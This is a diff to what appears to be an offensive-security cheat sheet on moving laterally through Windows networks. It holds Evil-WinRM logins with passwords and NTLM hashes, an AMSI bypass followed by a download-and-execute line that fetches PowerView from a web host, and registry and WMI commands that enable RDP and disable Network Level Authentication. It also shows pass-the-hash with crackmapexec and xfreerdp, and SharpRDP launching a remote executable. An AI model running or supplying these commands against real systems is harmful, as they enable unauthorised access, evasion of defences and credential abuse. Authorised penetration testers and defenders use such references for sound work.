@@ -132,8 +132,12 @@ Require:
 ```powershell
 root@payload$ git clone https://github.com/Hackplayers/evil-winrm
 root@payload$ evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]
-root@payload$ evil-winrm.rb -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
-root@payload$ ruby evil-winrm.rb -i 10.0.0.20 -u user -H BD1C6503987F8FF006296118F359FA79
+root@payload$ ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
+root@payload$ ruby evil-winrm.rb -i 10.0.0.20 -u username -H BD1C6503987F8FF006296118F359FA79
+root@payload$ ruby evil-winrm.rb -i 10.0.0.20 -u username -p password -r domain.local
+
+*Evil-WinRM* PS > Bypass-4MSI
+*Evil-WinRM* PS > IEX([Net.Webclient]::new().DownloadString("http://127.0.0.1/PowerView.ps1"))
 ```
 
 or using a custom ruby code to interact with the WinRM service.
@@ -168,6 +172,11 @@ end
 
 ```powershell
 PS> Enable-PSRemoting
+
+# use credential
+PS> $pass = ConvertTo-SecureString 'supersecurepassword' -AsPlainText -Force
+PS> $cred = New-Object System.Management.Automation.PSCredential ('DOMAIN\Username', $pass)
+PS> Invoke-Command -ComputerName DC -Credential $cred -ScriptBlock { whoami }
 
 # one-to-one interactive session
 PS> Enter-PSSession -computerName DC01
@@ -239,54 +248,49 @@ PS C:\> PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe -
 
 ## RDP Remote Desktop Protocol 
 
-Abuse RDP protocol to execute commands remotely with [SharpRDP](https://github.com/0xthirteen/SharpRDP)
+:warning: **NOTE**: You may need to enable RDP and disable NLA and fix CredSSP errors.
 
 ```powershell
-PS C:\> SharpRDP.exe computername=target.domain command="C:\Temp\file.exe" username=domain\user password=password
-```
-
-Or connect remotely with `rdesktop`
-
-```powershell
-root@payload$ rdesktop -d DOMAIN -u username -p password 10.10.10.10 -g 70 -r disk:share=/home/user/myshare
-root@payload$ rdesktop -u username -p password -g 70 -r disk:share=/tmp/myshare 10.10.10.10
-# -g : the screen will take up 70% of your actual screen size
-# -r disk:share : sharing a local folder during a remote desktop session 
-```
-
-Note: you may need to enable it with the following command
-
-```powershell
+# Enable RDP
 PS C:\> reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f
 PS C:\> netsh firewall set service remoteadmin enable
 PS C:\> netsh firewall set service remotedesktop enable
-```
-
-or with psexec(sysinternals)
-
-```powershell
-PS C:\> psexec \\machinename reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
-```
-
-or with crackmapexec
-
-```powershell
+# Alternative
+C:\> psexec \\machinename reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
 root@payload$ crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
+
+# Fix CredSSP errors
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
+
+# Disable NLA
+PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
+PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
 ```
 
-or with Metasploit
+Abuse RDP protocol to execute commands remotely with the following commands;
 
-```powershell
-root@payload$ run getgui -u admin -p 1234
-```
+* `rdesktop`
+    ```powershell
+    root@payload$ rdesktop -d DOMAIN -u username -p password 10.10.10.10 -g 70 -r disk:share=/home/user/myshare
+    root@payload$ rdesktop -u username -p password -g 70% -r disk:share=/tmp/myshare 10.10.10.10
+    # -g : the screen will take up 70% of your actual screen size
+    # -r disk:share : sharing a local folder during a remote desktop session 
+    ```
+* `freerdp` 
+    ```powershell
+    root@payload$ xfreerdp /v:10.0.0.1 /u:'Username' /p:'Password123!' +clipboard /cert-ignore /size:1366x768 /smart-sizing
+    root@payload$ xfreerdp /v:10.0.0.1 /u:username # password will be asked
+    
+    # pass the hash using Restricted Admin, need an admin account not in the "Remote Desktop Users" group.
+    # pass the hash works for Server 2012 R2 / Win 8.1+
+    root@payload$ xfreerdp /v:10.0.0.1 /u:username /d:domain /pth:88a405e17c0aa5debbc9b5679753939d  
+    ```
+* [SharpRDP](https://github.com/0xthirteen/SharpRDP)
+    ```powershell
+    PS C:\> SharpRDP.exe computername=target.domain command="C:\Temp\file.exe" username=domain\user password=password
+    ```
 
-or with xfreerdp 
-
-```powershell
-root@payload$ xfreerdp /u:offsec /d:win2012 /pth:88a405e17c0aa5debbc9b5679753939d /v:10.0.0.1 # pass the hash works for Server 2012 R2 / Win 8.1+
-root@payload$ xfreerdp -u test -p 36374BD2767773A2DD4F6B010EC5EE0D 192.168.226.129 # pass the hash using Restricted Admin, need an admin account not in the "Remote Desktop Users" group.
-root@payload$ xfreerd /u:runner /v:10.0.0.1 # password will be asked
-```
 
 ## Netuse 
 
